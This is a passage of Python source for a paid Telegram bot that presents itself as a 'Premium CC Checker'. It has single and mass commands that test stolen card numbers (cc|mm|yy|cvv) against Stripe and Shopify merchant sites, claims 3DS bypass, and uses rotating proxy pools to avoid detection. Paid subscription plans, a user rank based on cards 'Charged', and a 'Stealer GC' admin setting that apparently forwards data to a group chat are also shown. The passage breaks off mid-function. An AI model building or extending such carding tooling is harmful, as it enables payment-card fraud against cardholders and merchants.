        f"[⌯] 𝗕𝗼𝘁 ⌁ ⌁ SRK™ ⌁ ⌁ 💠\n"
        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛 ⌁ 💎\n"
        f"\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"\n"
        f"[⌯] 𝗚𝗮𝘁𝗲 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 · 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 · 𝙷𝚒𝚝𝚝𝚎𝚛𝚜 ⌁ 🎯\n"
        f"[⌯] 𝟯𝗗𝗦 ⌁ 𝙱𝚢𝚙𝚊𝚜𝚜 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍 ⌁ ✅\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙷𝚃𝚃𝙿 · 𝚂𝙾𝙲𝙺𝚂𝟺 · 𝚂𝙾𝙲𝙺𝚂𝟻 ⌁ 🔗\n"
        f"[⌯] 𝗦𝗽𝗲𝗲𝗱 ⌁ 𝙼𝚞𝚕𝚝𝚒-𝚠𝚘𝚛𝚔𝚎𝚛 · 𝚁𝚘𝚝𝚊𝚝𝚒𝚗𝚐 ⌁ 🚀\n"
        f"\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"\n"
        f"[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝗶𝗼𝗻 𝚋𝗲𝗹𝗼𝘄 ⌁ 🔻"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_main())


@bot.on(events.CallbackQuery(pattern=b"close"))
async def cb_close(event):
    await event.answer()
    try:
        await bot.delete_messages(event.chat_id, event.message_id)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ CHECKER PANEL
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"gates"))
async def cb_gates(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    await event.answer()
    text = pe(
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 𝙶𝚊𝚝𝚎 ⌁ ⚡\n"
        f"{SEP}\n"
        f"[⌯] 𝗦𝗶𝗻𝗴𝗹𝗲 ⌁ /sh cc|mm|yy|cvv ⌁ 💳\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝚁𝚎𝚙𝚕𝚢 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 /msh ⌁ 🔥\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝙾𝚛 𝚜𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚍𝚒𝚛𝚎𝚌𝚝𝚕𝚢 ⌁ 📦\n\n"
        f"{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 𝚂𝚃𝚁𝙸𝙿𝙴 𝙰𝚄𝚃𝙷 ⌁ ⚡\n"
        f"{SEP}\n"
        f"[⌯] 𝗦𝗶𝗻𝗴𝗹𝗲 ⌁ /st cc|mm|yy|cvv ⌁ 💳\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝚁𝚎𝚙𝚕𝚢 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 /mst ⌁ 🔥\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝙾𝚛 𝚜𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚍𝚒𝚛𝚎𝚌𝚝𝚕𝚢 ⌁ 📦\n\n"
        f"{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 𝚂𝚃𝚁𝙸𝙿𝙴 𝙲𝙷𝙰𝚁𝙶𝙴 ⌁ ⚡\n"
        f"{SEP}\n"
        f"[⌯] 𝗦𝗶𝗻𝗴𝗹𝗲 ⌁ /st1 cc|mm|yy|cvv ⌁ 💳\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝚁𝚎𝚙𝚕𝚢 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 /mst1 ⌁ 🔥\n"
        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝙾𝚛 𝚜𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚍𝚒𝚛𝚎𝚌𝚝𝚕𝚢 ⌁ 📦"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_gates())


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ PLANS / PROFILE / COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"^plans$"))
async def cb_plans(event):
    await event.answer()
    text = pe(
        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙿𝚕𝚊𝚗𝚜 ⌁ 💎\n\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 — 𝚗𝚘 𝚌𝚛𝚎𝚍𝚒𝚝 𝚍𝚎𝚍𝚞𝚌𝚝𝚒𝚘𝚗 ⌁ ♾️\n{SEP}\n"
        f"[⌯] 𝗧𝗿𝗶𝗮𝗹 ⌁ 𝙵𝚛𝚎𝚎 ⌁ 🎁\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹 𝙷𝚘𝚞𝚛𝚜 ⌁ ⏰\n{SEP}\n"
        f"[⌯] 𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟶 ⌁ 💰\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟽 𝙳𝚊𝚢𝚜 ⌁ 📅\n{SEP}\n"
        f"[⌯] 𝗕𝗶-𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟾 ⌁ 🤑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟷𝟻 𝙳𝚊𝚢𝚜 ⌁ 📆\n{SEP}\n"
        f"[⌯] 𝗠𝗼𝗻𝘁𝗵𝗹𝘆 ⌁ $𝟹𝟶 ⌁ 👑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹𝟶 𝙳𝚊𝚢𝚜 ⌁ 🗓️\n{SEP}\n"
        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ 🔑\n"
        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} ⌁ 💬"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_plans())


@bot.on(events.CallbackQuery(pattern=b"^profile$"))
async def cb_profile(event):
    await event.answer()
    uid = event.sender_id
    name, username = await get_user_info(uid)
    handle = f"@{username}" if username else "none"
    if is_admin(uid):
        role = "Admin"
    elif get_plan_info(uid):
        role = get_plan_info(uid).get("source", "Key").title()
    elif str(uid) in load_premium_users():
        role = "Key"
    else:
        role = "Free"
    plan_info = get_plan_info(uid)
    plan_status = "Active" if plan_info else "No Plan"
    expires = format_expiry(uid) if plan_info else "—"
    user_proxies_list = get_user_proxy_list(uid)
    proxy_status = f"{len(user_proxies_list)} set" if user_proxies_list else "Not Set"
    charged = get_user_charged(uid)
    rank = get_rank(charged)
    text = pe(
        f"[⌯] 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 ⌁ 𝚄𝚜𝚎𝚛 𝙸𝚗𝚏𝗼 ⌁ 👑\n\n{SEP}\n"
        f"[⌯] 𝗡𝗮𝗺𝗲 ⌁ › {name} ‹\n"
        f"[⌯] 𝗛𝗮𝗻𝗱𝗹𝗲 ⌁ {handle} ⌁ 📛\n"
        f"[⌯] 𝗜𝗗 ⌁ {uid} ⌁ 🆔\n\n{SEP}\n"
        f"[⌯] 𝗥𝗼𝗹𝗲 ⌁ {role} ⌁ 🎭\n"
        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_status} ⌁ 💠\n"
        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {expires} ⌁ ⏳\n\n{SEP}\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {proxy_status} ⌁ 🔌\n"
        f"[⌯] 𝗥𝗮𝗻𝗸 ⌁ {rank} 🏆\n"
        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {charged} ⌁ 💎\n"
        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ 🔑\n"
        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ /plans ⌁ ⭐"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_profile())


@bot.on(events.CallbackQuery(pattern=b"^commands$"))
async def cb_commands(event):
    await event.answer()
    text = pe(
        f"[⌯] 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 ⌁ 𝚁𝚎𝚏𝚎𝚛𝚎𝚗𝚌𝚎 ⌁ 📖\n\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ ⚡\n"
        f"[⌯] /sh ⌁ 𝚜𝚒𝚗𝚐𝚕𝚎 𝚌𝚑𝚎𝚌𝚔 ⌁ 💳\n"
        f"[⌯] /msh ⌁ 𝚖𝚊𝚜𝚜 𝚌𝚑𝚎𝚌𝚔 ⌁ 🔥\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 ⌁ ♾️\n\n{SEP}\n"
        f"[⌯] 𝗚𝗮𝘁𝗲𝘀 ⌁ 🎯\n"
        f"[⌯] /st ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 𝙰𝚞𝚝𝚑 ⌁ 💳\n"
        f"[⌯] /mst ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 𝙰𝚞𝚝𝚑 𝚖𝚊𝚜𝚜 ⌁ 🔥\n"
        f"[⌯] /st1 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝚑𝚊𝚛𝚐𝚎 ⌁ 💎\n"
        f"[⌯] /mst1 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 𝙲𝚑𝚊𝚛𝚐𝚎 𝚖𝚊𝚜𝚜 ⌁ 🔥\n"
        f"[⌯] /whop ⌁ 𝚆𝚑𝚘𝚙 ⌁ 🎯\n"
        f"[⌯] /jio ⌁ 𝙹𝚒𝗼 𝚑𝚒𝚝𝚝𝚎𝚛 ⌁ 📱\n\n{SEP}\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 🔌\n"
        f"[⌯] /setproxy ⌁ 𝚊𝚍𝚍 𝚙𝚛𝚘𝚡𝚢 ⌁ 🛠️\n"
        f"[⌯] /chkproxy ⌁ 𝚝𝚎𝚜𝚝 𝚙𝚛𝗼𝘅𝘆 ⌁ ✅\n"
        f"[⌯] /clearuserproxy ⌁ 𝚛𝚎𝚖𝗼𝘃𝗲 ⌁ 🗑️\n\n{SEP}\n"
        f"[⌯] 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀 ⌁ 🌐\n"
        f"[⌯] /mysites ⌁ 𝚟𝚒𝚎𝘄 𝚜𝚒𝚝𝚎𝚜 ⌁ 📋\n"
        f"[⌯] /setmysites ⌁ 𝚊𝚍𝚍 𝚜𝚒𝚝𝚎𝚜 ⌁ ➕\n"
        f"[⌯] /clearmysites ⌁ 𝚛𝚎𝗺𝗼𝘃𝗲 ⌁ 🗑️\n\n{SEP}\n"
        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ 💎\n"
        f"[⌯] /myplan ⌁ 𝚌𝚑𝚎𝚌𝚔 𝚙𝚕𝚊𝚗 ⌁ 📊\n"
        f"[⌯] /redeem ⌁ 𝚛𝚎𝚍𝚎𝚎𝗺 𝚔𝚎𝚢 ⌁ 🔑\n"
        f"[⌯] /plans ⌁ 𝚟𝚒𝚎𝘄 𝚙𝚕𝚊𝚗𝚜 ⌁ ⭐\n\n{SEP}\n"
        f"[⌯] 𝗧𝗼𝗼𝗹𝘀 ⌁ ⚙️\n"
        f"[⌯] /bin ⌁ 𝙱𝙸𝙽 𝚕𝗼𝗼𝗸𝘂𝗽 ⌁ 🔍\n"
        f"[⌯] /genbin ⌁ 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎 ⌁ 🎴\n"
        f"[⌯] /split ⌁ 𝚜𝚙𝚕𝚒𝚝 𝚏𝚒𝚕𝚎 ⌁ 📂\n"
        f"[⌯] /fb ⌁ 𝚏𝚎𝚎𝚍𝚋𝚊𝚌𝗸 ⌁ 📝"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_commands())


@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
async def cb_manage_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    await event.answer()
    user_list = get_user_proxy_list(uid)
    pool = load_proxies()
    proxy_status = f"{len(user_list)} set" if user_list else "Not set"
    text = pe(
        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 ⌁ 🔌\n{SEP}\n"
        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝘆 ⌁ {proxy_status} ⌁ 🔐\n"
        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(pool)} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n"
        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {MASS_WORKERS} 𝚠𝚘𝚛𝚔𝚎𝚛𝚜 ⌁ ⚙️\n{SEP}\n"
        f"[⌯] 𝗦𝗲𝘁 ⌁ /setproxy ip:port ⌁ 🌐\n"
        f"[⌯] 𝗔𝘂𝘁𝗵 ⌁ /setproxy ip:port:user:pass ⌁ 🔑\n"
        f"[⌯] 𝗨𝗿𝗹 ⌁ /setproxy http://user:pass@ip:port ⌁ 🔗\n"
        f"[⌯] 𝗦𝗢𝗖𝗞𝗦𝟱 ⌁ /setproxy socks5://user:pass@ip:port ⌁ 🧦\n"
        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝 ⌁ 📁\n"
        f"[⌯] 𝗖𝗹𝗲𝗮𝗿 ⌁ /clearuserproxy ⌁ 🗑️"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))


@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
async def cb_toggle_pool(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    current = user_pool_enabled.get(uid, True)
    user_pool_enabled[uid] = not current
    save_user_pool()
    state = "ON" if not current else "OFF"
    await event.answer(f"Pool: {state}", alert=False)


@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
async def cb_test_proxy_btn(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    user_list = get_user_proxy_list(uid)
    if not user_list:
        await event.answer("❌ No proxy set. Use /setproxy first.", alert=True)
        return
    proxy = user_list[0]
    await event.answer("⏳ Testing...", alert=False)
    result = await test_proxy(proxy)
    if result['status'] == 'alive':
        ip_info = await get_proxy_ip(proxy)
        await event.answer(f"✅ Alive — {ip_info or 'N/A'}", alert=True)
    else:
        await event.answer("❌ Proxy Dead", alert=True)


@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
async def cb_remove_proxy_btn(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    remove_user_proxy(uid)
    await event.answer("✅ Proxy removed!", alert=True)


@bot.on(events.CallbackQuery(pattern=b"redeem_info"))
async def cb_redeem_info(event):
    await event.answer()
    text = pe(
        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ 𝙺𝚎𝚢 𝙰𝚌𝚝𝚒𝚟𝚊𝚝𝚒𝚘𝚗 ⌁ 🔑\n{SEP}\n"
        f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /redeem KEY ⌁ ⌨️\n"
        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} ⌁ 💬"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_redeem_info())




# ══════════════════════════════════════════════════════════════════════════════
#  ▸ ADMIN PANEL
# ══════════════════════════════════════════════════════════════════════════════
def _admin_panel_text():
    pcount = len(load_premium_users())
    scount = len(load_sites())
    prcount = len(load_proxies())
    stealer = load_stealer_gc() or "Not Set"
    return pe(
        f"[⌯] 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 ⌁ 𝙳𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍 ⌁ 👑\n\n{SEP}\n"
        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝙾𝚗𝚕𝚒𝚗𝚎 ⌁ 🟢\n"
        f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {pcount} ⌁ 👥\n"
        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {scount} ⌁ 🌐\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {prcount} ⌁ 📡\n"
        f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ {stealer} ⌁ 🕵️"
    )


@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_panel_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n❌ Admin only!"), parse_mode='html')
        return
    await raw_send(event.sender_id, _admin_panel_text(), rows_admin())


@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def cb_admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ ADMIN: ADD/REMOVE ADMIN
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/addadmin(\s|$)'))
async def add_admin_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"❌ Usage: /addadmin chat_id or @username"), parse_mode='html'); return
    target = parts[1].strip()
    target_id = None
    try:
        target_id = int(target)
    except ValueError:
        if target.startswith('@'):
            try:
                entity = await bot.get_entity(target)
                target_id = entity.id
            except Exception as e:
                await event.reply(pe(f"❌ Could not find user: <code>{e}</code>"), parse_mode='html'); return
        else:
            await event.reply(pe(f"❌ Invalid format"), parse_mode='html'); return
    if not target_id:
        await event.reply(pe(f"❌ Could not resolve"), parse_mode='html'); return
    if target_id in ADMIN_IDS:
        await event.reply(pe(f"⚠️ Already admin"), parse_mode='html'); return
    ADMIN_IDS.add(target_id)
    _save_admin_ids(ADMIN_IDS)
    await event.reply(pe(f"✅ Added admin ⌁ <code>{target_id}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmadmin(\s|$)'))
async def remove_admin_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"❌ Usage: /rmadmin chat_id"), parse_mode='html'); return
    try:
        target_id = int(parts[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Invalid ID"), parse_mode='html'); return
    if target_id == OWNER_ID:
        await event.reply(pe(f"❌ Cannot remove owner!"), parse_mode='html'); return
    if target_id not in ADMIN_IDS:
        await event.reply(pe(f"⚠️ Not admin"), parse_mode='html'); return
    ADMIN_IDS.discard(target_id)
    _save_admin_ids(ADMIN_IDS)
    await event.reply(pe(f"✅ Removed ⌁ <code>{target_id}</code>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ ADMIN: STEALER GC
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/setstealer(\s|$)'))
async def set_stealer_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        current = load_stealer_gc()
        await event.reply(pe(f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ 🕵️\n{SEP}\n[⌯] 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ⌁ {current or 'Not Set'}\n{SEP}\n[⌯] /setstealer <chat_id>\n[⌯] /setstealer off"), parse_mode='html')
        return
    value = parts[1].strip()
    if value.lower() in ('off', 'none', '0'):
        set_stealer_gc(0)
        await event.reply(pe(f"✅ Stealer GC disabled"), parse_mode='html'); return
    try:
        chat_id = int(value)
    except Exception:
        try:
            entity = await bot.get_entity(value)
            chat_id = entity.id
        except Exception as e:
            await event.reply(pe(f"❌ Invalid: <code>{e}</code>"), parse_mode='html'); return
    set_stealer_gc(chat_id)
    await event.reply(pe(f"✅ Stealer GC set ⌁ <code>{chat_id}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stealerinfo$'))
async def stealer_info_command(event):
    if not is_admin(event.sender_id):
        return
    current = load_stealer_gc()
    await event.reply(pe(f"[⌯] 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 𝗚𝗖 ⌁ 🕵️\n{SEP}\n[⌯] 𝗖𝗵𝗮𝘁 𝗜𝗗 ⌁ {current or 'Not Set'}"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ ADMIN: SITES / PROXY POOL
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def cb_admin_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    scount = len(load_sites())
    text = pe(f"[⌯] 𝗦𝗶𝘁𝗲 𝗠𝗴𝗺𝘁 ⌁ {scount} ⌁ 🌐\n\n{SEP}\n[⌯] /addsite ⌁ [url]\n[⌯] /rmsite ⌁ [url]\n[⌯] /sites ⌁ 𝚅𝚒𝚎𝘄\n[⌯] /checksites ⌁ 𝙷𝚎𝚊𝚕𝚝𝚑")
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())


@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
async def cb_admin_list_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    sites = load_sites()
    if not sites:
        await event.answer("🌐 No sites yet.", alert=True); return
    lines = "\n".join([s.replace("https://", "").replace("http://", "") for s in sites[:30]])
    more = f"\n...and {len(sites)-30} more." if len(sites) > 30 else ""
    text = pe(f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(sites)} 🌐\n\n{SEP}\n{lines}{more}")
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())


@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
async def cb_admin_proxy_pool(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    proxies = load_proxies()
    sample = proxies[0] if proxies else "—"
    text = pe(
        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} ⌁ 📡\n\n{SEP}\n"
        f"[⌯] 𝗦𝗮𝗺𝗽𝗹𝗲 ⌁ {sample}\n\n{SEP}\n"
        f"[⌯] /addproxy ⌁ [𝚙𝚛𝚘𝚡𝚢]\n[⌯] /rmproxy ⌁ [𝚙𝚛𝚘𝚡𝚢]\n"
        f"[⌯] /clearproxy ⌁ 𝙲𝚕𝚎𝚊𝚛\n[⌯] /getproxy ⌁ 𝙶𝚎𝚝\n"
        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ 𝚂𝚎𝚗𝚍 .𝚝𝚡𝚝"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())


@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
async def cb_admin_list_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    proxies = load_proxies()
    if not proxies:
        await event.answer("📡 No proxies yet.", alert=True); return
    lines = "\n".join(proxies[:20])
    more = f"\n...and {len(proxies)-20} more." if len(proxies) > 20 else ""
    text = pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 📡\n\n{SEP}\n{lines}{more}")
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())


@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
async def cb_admin_clear_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    count = len(load_proxies())
    with open(PROXY_FILE, 'w') as f:
        f.write("")
    await event.answer(f"🗑️ {count} proxies cleared!", alert=True)


@bot.on(events.CallbackQuery(pattern=b"admin_check_sites"))
async def cb_admin_check_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔍 Checking...", alert=False)
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        return
    smsg = await event.respond(pe("🔥 Checking sites..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(sites), 10):
        batch = sites[i:i+10]
        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
        for r in results:
            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive:
            await f.write(f"{s}\n")
    await smsg.edit(pe(f"✅ 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=b"admin_check_proxies"))
async def cb_admin_check_proxies(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔍 Checking...", alert=False)
    proxies = load_proxies()
    if not proxies:
        return
    smsg = await event.respond(pe("🔥 Checking proxies..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 20):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+20]])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
        await asyncio.sleep(0.3)
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive:
            await f.write(f"{p}\n")
    await smsg.edit(pe(f"✅ 𝐏𝐫𝐨𝐱𝐲 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ ADMIN USERS / BROADCAST
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"admin_users"))
async def cb_admin_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    text = pe(
        f"[⌯] 𝗨𝘀𝗲𝗿 𝗠𝗴𝗺𝘁 ⌁ {len(load_premium_users())} ⌁ 👥\n{SEP}\n"
        f"[⌯] /grant ⌁ uid days\n[⌯] /auth ⌁ uid days\n[⌯] /revoke ⌁ uid\n{SEP}\n"
        f"[⌯] /addpremium ⌁ uid\n[⌯] /rmpremium ⌁ uid\n[⌯] /ban ⌁ uid\n[⌯] /unban ⌁ uid"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())


@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
async def cb_admin_list_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    users = load_premium_users()
    if not users:
        await event.answer("📋 No users yet.", alert=True); return
    lines = []
    for i, u in enumerate(users[:50]):
        try:
            uid_int = int(u)
            p = get_plan_info(uid_int)
            source = p.get("source", "key") if p else "key"
            exp = format_expiry(uid_int) if p else "—"
            lines.append(f"[⌯] {i+1} ⌁ {u} ⌁ {source} ⌁ {exp}")
        except Exception:
